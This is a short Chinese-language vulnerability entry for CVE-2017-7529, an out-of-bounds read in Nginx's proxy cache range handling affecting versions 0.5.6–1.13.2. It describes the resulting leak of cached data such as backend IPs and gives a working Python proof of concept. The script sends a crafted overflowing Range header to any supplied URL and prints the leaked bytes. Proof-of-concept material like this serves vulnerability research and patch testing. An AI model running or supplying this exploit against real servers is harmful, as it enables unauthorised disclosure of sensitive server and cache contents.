# CVE-2017-7529 Nginx越界读取缓存漏洞 #
## 受影响版本 ##
Nginx version 0.5.6 - 1.13.2
## 平台 ##
windows 、linux 等多平台
## 测试系统 ##
ubuntu
## 类型 ##
远程
## 描述 ##
该漏洞影响所有 0.5.6 - 1.13.2版本内默认配置模块的Nginx只需要开启缓存攻击者即可发送恶意请求进行远程攻击造成信息泄露。当Nginx服务器使用代理缓存的情况下攻击者通过利用该漏洞可以拿到服务器的后端真实IP或其他敏感信息。
## POC ##
<pre class="prettyprit lang-javascript">
import sys
import requests

if len(sys.argv) &lt; 2:
    print(&quot;%s url&quot; % (sys.argv[0]))
    print(&quot;eg: python %s http://your-ip:8080/&quot; % (sys.argv[0]))
    sys.exit()

headers = {
    &#x27;User-Agent&#x27;: &quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&quot;
}
offset = 6050
url = sys.argv[1]
file_len = len(requests.get(url, headers=headers).content)
n = file_len + offset
headers[&#x27;Range&#x27;] = &quot;bytes=-%d,-%d&quot; % (
    n, 0x8000000000000000 - n)

r = requests.get(url, headers=headers)
print(r.text)
</pre>